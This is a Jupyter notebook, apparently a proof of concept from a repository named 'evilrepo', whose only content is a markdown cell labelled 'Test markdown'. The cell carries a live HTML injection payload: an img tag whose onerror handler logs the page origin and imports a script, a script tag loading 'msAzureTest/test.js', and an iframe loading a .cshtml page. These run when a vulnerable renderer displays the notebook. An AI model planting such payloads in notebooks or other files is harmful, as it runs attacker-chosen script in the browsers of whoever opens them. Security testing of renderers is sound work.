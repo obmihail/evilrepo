{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Test markdown<img src=x1 onerror=console.log(origin);import(this.alt); alt='./test.js'  ><script src='msAzureTest/test.js?1'></script><iframe src='msAzureTest/test.cshtml'>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
